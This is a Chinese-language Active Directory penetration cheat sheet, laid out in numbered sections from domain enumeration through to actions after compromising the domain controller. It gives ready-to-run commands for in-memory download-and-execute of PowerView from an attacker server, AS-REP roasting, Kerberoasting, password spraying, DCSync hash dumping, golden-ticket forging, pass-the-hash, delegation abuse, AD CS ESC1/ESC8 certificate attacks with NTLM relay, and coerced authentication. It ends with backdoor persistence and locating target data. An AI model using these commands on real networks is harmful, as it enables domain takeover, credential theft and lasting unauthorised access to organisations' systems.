# AD 域渗透核心技法

## 1. 域基础认知

域 = 由 DC（域控制器）集中认证的 Windows 网络。攻击核心逻辑：拿「任意域账户」→ 枚举全域 → 沿权限链爬到 Domain Admin → DCSync 导出全域哈希。Kerberos 是核心协议：TGT（入场券）+ TGS（服务票），所有票据攻击都围绕「伪造/窃取/滥用票据」。

## 2. 域信息收集

```powershell
# PowerView（内存加载）
IEX(New-Object Net.WebClient).DownloadString('http://vps/PowerView.ps1')
Get-NetDomain; Get-NetDomainController
Get-NetUser | select samaccountname,pwdlastset,description
Get-NetGroup "Domain Admins" | Get-NetGroupMember
Get-NetComputer -OperatingSystem "*server*"
Get-NetSession -ComputerName dc01          # 会话枚举：定位管理员登录机
Find-LocalAdminAccess                      # 找当前用户对哪些机器有本地管理员

# 无域账户时（域外）：adfind/ldapsearch 需先拿一个账户（喷洒/凭据复用）
```

## 3. 凭据型攻击（无漏洞，纯协议）

| 攻击 | 前提 | 命令 | 产出 |
| --- | --- | --- | --- |
| AS-REP Roasting | 账户「不要求预认证」 | `GetNPUsers.py corp.local/ -dc-ip DC -no-pass` | 可离线爆破的哈希 |
| Kerberoasting | 任意域账户 | `GetUserSPNs.py corp.local/u:p -dc-ip DC -request` | SPN 服务账户哈希 → hashcat `-m 13100` |
| 密码喷洒 | 用户列表 | `nxc smb DC -u users.txt -p 'Pass@2026' --continue-on-success` | 有效凭据 |
| DCSync | DA/复制权限 | `secretsdump.py corp.local/admin@DC` | 全域哈希（含 krbtgt） |

## 4. 票据攻击

| 攻击 | 需要什么 | 做什么 |
| --- | --- | --- |
| 黄金票据 | krbtgt 哈希 + 域 SID | 伪造任意用户 TGT，长期控制域 |
| 白银票据 | 服务账户哈希 | 伪造特定服务 TGS，只打该服务，隐蔽 |
| PTH/PTK | 账户 NTLM/AES key | `psexec.py -hashes :NTLM admin@host` |
| PTT | 票据（ccache/kirbi） | `export KRB5CCNAME=x.ccache` + impacket `-k` |

```bash
# 黄金票据完整流程
secretsdump.py corp.local/DA@dc01            # 拿 krbtgt
lookupsects.py 或用 lookupsid 获取域 SID
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass dc01.corp.local
```

## 5. 委派攻击（域内三大委派）

| 类型 | 特征 | 利用 |
| --- | --- | --- |
| 非约束委派 | `TrustedForDelegation` | 诱导 DC/管理员访问 → 抓其 TGT（打印机 bug / MS-RPRN 强制认证） |
| 约束委派 | `TrustedToAuthForDelegation` | S4U2Self+S4U2Proxy 拿目标服务票：`getST.py -spn cifs/target -impersonate admin` |
| 基于资源的委派 (RBCD) | 对目标计算机对象有写权限 | 修改 `msDS-AllowedToActOnBehalfOfOtherIdentity` → 同上 S4U 链拿票 |

排查命令：`Get-DomainUser -TrustedToAuth`、`Get-DomainComputer -TrustedToAuth`（PowerView）。

## 6. AD CS（证书服务）攻击（ESC 系列）

```bash
certipy find -u user@corp.local -p pass -vulnerable   # 扫 ESC1-ESC11 全家族
# ESC1（模板允许指定 SAN 且客户端认证）：
certipy req -u user -p pass -ca corp-CA -template VulnTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx                    # 直接拿管理员 NT 哈希
# ESC8（Web 注册接口 + NTLM 中继，最常实战命中）：
ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs --template DomainController
# 配合强制认证（petitpotam/coercer）打 DC → 直接拿 DC 机器票
```

## 7. 强制认证三剑客（中继弹药来源）

PetitPotam（MS-EFSR）、PrinterBug（MS-RPRN）、ShadowCoerce——让 DC 主动向攻击机发起 NTLM 认证，配合 ntlmrelayx 中继到 LDAP/LDAPS（拿 RBCD）或 AD CS HTTP（ESC8）。

## 8. 拿下域控后的动作

1. DCSync 全量导出（含 krbtgt）。
2. 留黄金票据/DSRM 后门（07 分册）。
3. 全域装机清单 + 管理员习惯分析，规划数据定位（域文件服务器、代码库、DBA 机）。
